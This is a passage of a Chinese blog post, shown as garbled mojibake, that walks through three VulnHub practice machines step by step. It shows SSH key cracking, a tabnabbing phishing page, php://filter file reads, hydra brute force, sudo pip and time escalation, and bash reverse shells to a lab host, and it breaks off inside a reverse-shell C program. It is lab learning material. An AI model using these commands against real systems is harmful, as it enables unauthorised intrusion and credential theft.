3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br>63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br>8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ<br>E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br>5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br>1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><ol start="8"><li>ç°åœ¨æˆ‘ä»¬æ‹¿åˆ°äº†ç§é’¥ï¼Œè¿˜çŸ¥é“ç”¨æˆ·åicex64ï¼Œå°è¯•ç›´æ¥sshç§é’¥ç™»å½•å¤±è´¥ï¼Œæœç´¢å¾—çŸ¥ï¼Œå¯ä»¥åˆ©ç”¨<code>john</code>å·¥å…·ä»ç§é’¥ä¸­çˆ†ç ´å‡ºç”¨æˆ·å¯†ç </li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">python <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>ssh2john.py id_rsa &gt; aaaa<br>john aaaa<br></code></pre></td></tr></table></figure><ol start="9"><li><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007113740113.png" alt="image-20231007113740113"></li><li>ç»™æˆ‘kaliçš„CPUæ‹‰æ»¡äº†hhh</li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007140821096.png" alt="image-20231007140821096"></p><ol start="11"><li><p>ç°åœ¨sshç™»å½•é¶æœºï¼Œè¿™é‡Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ä¸€ç›´é”™è¯¯ï¼Œäºæ˜¯æ‹¯æ•‘æ¨¡å¼ç™»è¿›é¶æœºæŠŠå¯†ç é‡ç½®äº†<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007141912495.png" alt="image-20231007141912495"></p></li><li></li></ol><p>æ¥ä¸‹æ¥å°è¯•ææƒ<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007142111784.png" alt="image-20231007142111784"></p><ol start="13"><li>è¿™å°±å¾ˆç®€å•äº†ï¼Œä¿®æ”¹&#x2F;home&#x2F;arsene&#x2F;beist.py æ–‡ä»¶ï¼Œå†™å…¥ææƒä»£ç ï¼Œpythonè¿è¡Œå³å¯</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pty<br>pty.spawn(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br></code></pre></td></tr></table></figure><ol start="14"><li>æŸ¥çœ‹æƒé™å‘ç°è¯¥è„šæœ¬æ–‡ä»¶åªèƒ½çœ‹ä¸èƒ½ä¿®æ”¹ï¼Œä½†æ˜¯è„šæœ¬æ–‡ä»¶æ‰§è¡Œäº†webbrowseråº“çš„openå‡½æ•°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> webbrowser<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Its not yet ready to get in action&quot;</span>)<br>webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;https://empirecybersecurity.co.mz&quot;</span>)<br></code></pre></td></tr></table></figure><ol start="15"><li>æŸ¥çœ‹webbrowseråº“ï¼Œå‘ç°ä»»æ„ç”¨æˆ·å¯å†™å…¥ï¼Œäºæ˜¯ä¿®æ”¹openå‡½æ•°ï¼Œæ·»åŠ <code>os.system(&#39;/bin/bash&#39;)</code>, è¿è¡Œheist.pyæ–‡ä»¶ï¼Œå¾—åˆ°arseneç”¨æˆ·çš„shell</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u arsene <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.9 /</span>home<span class="hljs-regexp">/arsene/</span>heist.py<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007144216893.png" alt="image-20231007144216893"></p><ol start="16"><li>ä¸‹ä¸€æ­¥sudo pipææƒ</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><ol start="17"><li>äº¤äº’å¼shell</li></ol><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="napping-1-0-1"><a href="#napping-1-0-1" class="headerlink" title="napping-1.0.1"></a>napping-1.0.1</h3><ol><li><p>æ‰«ipï¼Œç«¯å£å‘ç°22 8080</p></li><li><p>8080ä¸Šè¿è¡Œä¸€ä¸ªç™»é™†é¡µé¢å’Œä¸€ä¸ªè¾“å…¥æ¡†ï¼Œç®¡ç†å‘˜ä¼šç‚¹å‡»æˆ‘ä»¬è¾“å…¥çš„ç½‘å€<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008121235017.png" alt="image-20231008121235017"></p></li><li><p>æœç´¢å¾—çŸ¥æ­¤å¤„å¯ä»¥åˆ©ç”¨ <code>æ ‡ç­¾é’“é±¼</code> å³ <code>TabNapping</code> ï¼Œæˆ‘ä»¬åˆ©ç”¨kaliä¸Šçš„ä¸€æ¬¾ç¤¾å·¥å·¥å…· <code>setoolkit</code>ï¼Œåˆ›å»ºä¸€ä¸ªæ ‡ç­¾é’“é±¼ç½‘ç«™</p></li></ol><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">æ­¤å¤„è°ƒè¯•è½¯ä»¶åºŸäº†ä¸å°‘åŠŸå¤«ï¼Œå¤§æ¦‚çš„æŠ¥é”™æœ‰ä¸¤ä¸ªï¼šurllib has <span class="hljs-keyword">no</span> attribution named <span class="hljs-string">&#x27;urlopen&#x27;</span>; result <span class="hljs-number">404</span><br>æœç´¢å¾—åˆ°çš„è§£å†³æ–¹æ³•ä¸ºå°† /usr/share/<span class="hljs-keyword">set</span>/src/webattack/tabnabbing/tabnabbing.py ä¸­çš„<span class="hljs-comment">urllib.urlopen</span> æ”¹ä¸º <span class="hljs-comment">urllib.request.urlopen</span>ï¼Œ å¹¶æ³¨é‡Šåç»­çš„äº”è¡Œä»£ç <br>åŸç†ï¼špython2ä¸­çš„ urllib åº“å­˜åœ¨<span class="hljs-comment">urlopen</span>æ–¹æ³•ï¼Œä½†æ˜¯<span class="hljs-comment">python3</span>ä¸­å°†è¿™ä¸ªæ–¹æ³•æ”¾åœ¨äº†<span class="hljs-comment">urllib.reequest</span>ä¸‹ï¼›<span class="hljs-comment">404</span>çš„åŸå› æ˜¯ç›®æ ‡ç½‘ç«™å¯èƒ½å¹¶ä¸å­˜åœ¨å›¾æ ‡ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©ç›´æ¥åˆ é™¤å›¾æ ‡ï¼Œä¹Ÿå¯ä»¥å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨å†å†³å®šè¦ä¸è¦æ·»åŠ å›¾æ ‡<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008121558813.png" alt="image-20231008121558813"></p><ol start="4"><li>å†è‡ªå·±å†™ä¸€ä¸ªè·³è½¬ç½‘é¡µï¼Œç”¨pythonå¼€ä¸€ä¸ªhttpæœåŠ¡ï¼ŒæŠŠè¿™ä¸ªç½‘é¡µçš„urlå†™è¿›è¾“å…¥æ¡†ï¼Œè®©ç®¡ç†å‘˜ç‚¹å‡»å°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬ä¸Šé¢çš„é’“é±¼ç½‘ç«™</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">boby</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>.<span class="hljs-property">parent</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;http://192.168.1.15&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008123855027.png" alt="image-20231008123855027"></p><ol start="5"><li>okï¼ŒæˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œæˆ‘ä»¬å°è¯•sshç™»å½•ï¼ŒæˆåŠŸ</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> daniel@<span class="hljs-number">192.168.1.33</span><br>password=C<span class="hljs-variable">@ughtm3napping123</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008131000426.png" alt="image-20231008131000426"></p><ol start="6"><li>æ¥ä¸‹æ¥å¼€å§‹ææƒï¼Œsudoè¢«ç¦ç”¨ï¼ŒæŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°åœ¨&#x2F;home&#x2F;adrian&#x2F;ä¸‹å­˜åœ¨ä¸€ä¸ªpyè„šæœ¬æ–‡ä»¶ï¼Œå†…å®¹å¤§æ¦‚æ˜¯è®°å½•æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ï¼ŒæŸ¥çœ‹æ—¥å¿—å‘ç°ä¸¤åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œæˆ‘ä»¬ä¿®æ”¹è„šæœ¬ä»£ç ä¸º</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;/usr/bin/bash -c &#x27;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.15/8888&#x27; 0&gt;&amp;1&quot;</span>)<br></code></pre></td></tr></table></figure><ol start="7"><li><p>åŒæ—¶åœ¨kali(192.168.1.15)ç›‘å¬8888ç«¯å£ï¼Œè¿‡äº†ä¸¤åˆ†é’Ÿï¼ŒæˆåŠŸæ‹¿åˆ°adriançš„shell<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133315836.png" alt="image-20231008133315836"></p></li><li><p>æ¥ä¸‹æ¥åˆ©ç”¨adrianææƒï¼ŒæŸ¥çœ‹sudo -l<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133359694.png" alt="image-20231008133359694"></p></li><li><p>ok ï¼Œsudo vimææƒ<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png" alt="image-20231008133645461"></p></li></ol><h3 id="red1"><a href="#red1" class="headerlink" title="red1"></a>red1</h3><ol><li><p>æ‰«ipï¼Œç«¯å£å‘ç°ï¼Œå¼€æ”¾äº†22ï¼Œ80ï¼›å…¶ä¸­80ç«¯å£è¿è¡Œwordpress</p></li><li><p>dirbæ‰«ç›®å½•ï¼ŒåŒæ—¶è‡ªå·±ç‚¹è¿›ä¸»é¡µæŸ¥çœ‹ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªåŸŸå <code>redrocks.win</code> ï¼Œä¿®æ”¹hostsæ–‡ä»¶å°†åŸŸååœ°å€å¯¼å‘<code>192.168.448.135</code> </p></li><li><p>å’±ä»¬åšä¸¤æ‰‹å‡†å¤‡ï¼Œä¸€æ–¹é¢ç”¨wpscanæ‰«æ¼æ´å’Œçˆ†ç ´ç”¨æˆ·åå¯†ç ï¼Œå‘ç°ç”¨æˆ· <code>administrator</code> ï¼Œç”¨rockyouå­—å…¸è¿›è¡Œå¯†ç çˆ†ç ´ï¼›å¦ä¸€æ–¹é¢è¯»ç½‘é¡µæºç ï¼Œå‘ç°æç¤º <code>Mr.miessler</code> ï¼Œç»è¿‡æœç´¢å‘ç°æœ‰ä¸ªç›¸å…³githubé¡¹ç›®ä¸­æœ‰phpåé—¨å­—å…¸ï¼Œæˆ‘ä»¬åˆ©ç”¨ <code>dirb</code> å‘ç°ä¸€ä¸ªphpåé—¨ <code> /NetworkFileManagerPHP.php</code></p></li><li><p>è®¿é—® <code> /NetworkFileManagerPHP.php</code> æ— å›æ˜¾ï¼Œåˆ©ç”¨ <code>ffuf</code> å°è¯•çˆ†ç ´å‚æ•°</p></li></ol><p>ï¼ˆè¿™ä¸ªè¿‡ç¨‹ä¸­ç”±äºè¯·æ±‚è¿‡å¿«ï¼Œå¯¼è‡´é¶æœºå´©æºƒäº†ï¼Œå°è¯•äº†å¥½å‡ æ¬¡éƒ½æœ‰é—®é¢˜ğŸ˜‚ï¼‰<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019145058250.png" alt="image-20231019145058250"></p><ol start="5"><li><p>æ”¹ç”¨burpæ¥çˆ†ç ´å‚æ•°ï¼Œè¿™é‡Œç”¨çš„å­—å…¸<code>D:\tools\fuzzDicts-master\paramDict\parameter.txt</code><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019154450410.png" alt="image-20231019154450410"></p></li><li><p>æ¥ä¸‹æ¥æµ‹è¯•è¿™ä¸ªåé—¨æ˜¯ä»€ä¹ˆåŠŸèƒ½ï¼Œå·²ç»è¾“å…¥çš„å‘½ä»¤ <code>ls</code> ï¼Œæ— æ•ˆï¼Œå°è¯•è¾“å…¥ä¸€ä¸ªæ–‡ä»¶åœ°å€ <code>/etc/passwd</code> ï¼Œå¾ˆå¥½ï¼Œä»»æ„æ–‡ä»¶è¯»å–<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019154846474.png" alt="image-20231019154846474"></p></li><li><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯ä¸æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿ç”¨</p></li></ol><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?<span class="hljs-built_in">key</span>=php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=NetworkFileManagerPHP.php<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019155326248.png" alt="image-20231019155326248"></p><ol start="8"><li><p>é‚£å¥½åŠäº†ï¼Œè§£ç åçœ‹çœ‹æœ‰æ²¡æœ‰è¿‡æ»¤<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019155445880.png" alt="image-20231019155445880"></p></li><li><p>æœ‰ç‚¹ä¸œè¥¿ï¼Œè™½ç„¶æ²¡æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯è¿˜æœ‰ä¸ªæ³¨é‡Šï¼Œæˆ‘ä»¬å†è§£ç ä¸€æ¬¡</p></li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw</span>==<br>That password alone won<span class="hljs-string">&#x27;t help you! Hashcat says rules are rules</span><br></code></pre></td></tr></table></figure><ol start="10"><li>è¯»å–wp-config.php</li></ol><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=wp-config.php<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019161033785.png" alt="image-20231019161033785"></p><p>æ‹¿åˆ°è´¦å· <code>john</code> å¯†ç  <code>R3v_m4lwh3r3_k1nG!!</code>ï¼Œç›´æ¥å°è¯•sshï¼Œå¤±è´¥ï¼Œå¯†ç é”™è¯¯</p><ol start="11"><li>ä¹‹å‰çš„æ³¨é‡Šæç¤ºè¦ç”¨hashcatçš„ruleï¼Œæˆ‘ä»¬bingä¸€ä¸‹</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å…ˆå°†æˆ‘ä»¬çš„å¯†ç æ”¾è¿›ä¸€ä¸ªbase.txtæ–‡ä»¶ï¼Œç„¶åè¿è¡Œä»¥ä¸‹æŒ‡ä»¤<br>hashcat <span class="hljs-attr">--stdout</span> base<span class="hljs-selector-class">.txt</span> -r /usr/share/hashcat/rules/best64<span class="hljs-selector-class">.rule</span> -o password.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019161907131.png" alt="image-20231019161907131"></p><ol start="12"><li>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ä¹å¤´è›‡æˆ–è€…ç¾æœèè¿›è¡Œsshçˆ†ç ´</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ä¹å¤´è›‡ï¼š<br>hydra -l john -P password<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.48.135</span><br>ç¾æœèï¼š<br>medusa -h <span class="hljs-number">192.168</span>.<span class="hljs-number">48.135</span> -u john -P password<span class="hljs-selector-class">.txt</span> -M ssh<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162547602.png" alt="image-20231019162547602"></p><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162610010.png" alt="image-20231019162610010"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> john@<span class="hljs-number">192.168.48.135</span><br><span class="hljs-attribute">R3v_m4lwh3r3_k1nG</span>!!<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><ol><li><p>sshç™»å½•æˆåŠŸï¼Œä½†æ˜¯åˆšè¿ä¸Šå°±è¢«è¸¢æ‰äº†<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png" alt="image-20231019162750514"></p></li><li><p>æˆ‘ä»¬é‡æ–°çˆ†ç ´ï¼Œå‘ç°å¯†ç å·²ç»è¢«æ”¹<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png" alt="image-20231019162857617"></p></li><li><p>å†æ¬¡å°è¯•sshè¿æ¥ï¼Œå‘ç°äº†ä¸€å¼ ç»™è“é˜Ÿçš„å°çº¸æ¡ï¼Œå‘Šè¯‰æˆ‘ä»¬<code>cat</code> æŒ‡ä»¤æœ‰é—®é¢˜(æ—©å°±å‘ç°äº†ï¼Œcatå’Œvimäº’æ¢)ï¼ŒåŒæ—¶ <code>sudo -l</code> å‘ç°ç”¨æˆ· <code>ippsec</code>å¯æ‰§è¡Œå‘½ä»¤<code>usr/bin/time</code><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png" alt="image-20231019163337680"></p></li><li><p>åˆ©ç”¨å…¶ä»–ç”¨æˆ·å‘½ä»¤æ‰§è¡Œå’Œ<code>time</code> æŒ‡ä»¤ææƒï¼Œå¯ä»¥è·³è½¬åˆ° <code>ippsec</code> ç”¨æˆ·</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u ippsec <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/time /</span>bin/sh<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png" alt="image-20231019164601120"></p><ol start="5"><li>è¿™é‡Œå‘ç°åˆ‡æ¢ç”¨æˆ·åä»ç„¶ä¼šæ–­å¼€è¿æ¥ï¼Œäºæ˜¯è¿”å›ä¸Šä¸€æ­¥ï¼Œç›´æ¥åå¼¹shell</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> -u ippsec /bin/time /bin/sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.48.129</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶kaliç›‘å¬8888ç«¯å£ï¼ŒæˆåŠŸæ‹¿åˆ° <code>ippsec</code> ç”¨æˆ·çš„shellä¸”ä¸ä¼šæ–­å¼€ï¼Œåˆ©ç”¨pythonæ‹¿åˆ°äº¤äº’å¼å‘½ä»¤è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><ol start="6"><li><p>åˆ°è¿™ä¸€æ­¥æ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œå°è¯•ä¸Šä¼ ææƒè„šæœ¬ä¹Ÿæç¤ºæ— æƒé™ï¼Œç»è¿‡æœç´¢å‘ç° <code>ippsec</code> ç”¨æˆ·åœ¨ <code>/var/www/wordpress/.git</code> ç›®å½•ä¸‹å…·æœ‰å¯å†™æƒé™ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨è¯¥ç›®å½•å°è¯•ä¸Šä¼ è„ç‰›å†…æ ¸ææƒè„šæœ¬ï¼Œå¤±è´¥äº†ï¼Œä½†æ˜¯åœ¨è¯¥ç›®å½•ä¸‹å‘ç°äº†å¦ä¸€ä¸ªcè¯­è¨€æ–‡ä»¶<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png" alt="image-20231020131018436"></p></li><li><p>ä¼¼ä¹æ˜¯ç”¨æ¥è¸¢ä¸‹çº¿å‰è­¦å‘Šçš„ç¨‹åºï¼ŒçŒœæµ‹æ˜¯rootèº«ä»½è¿è¡Œçš„ï¼Œä¿®æ”¹å†…å®¹ä¸ºåå¼¹shellçš„cä»£ç </p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 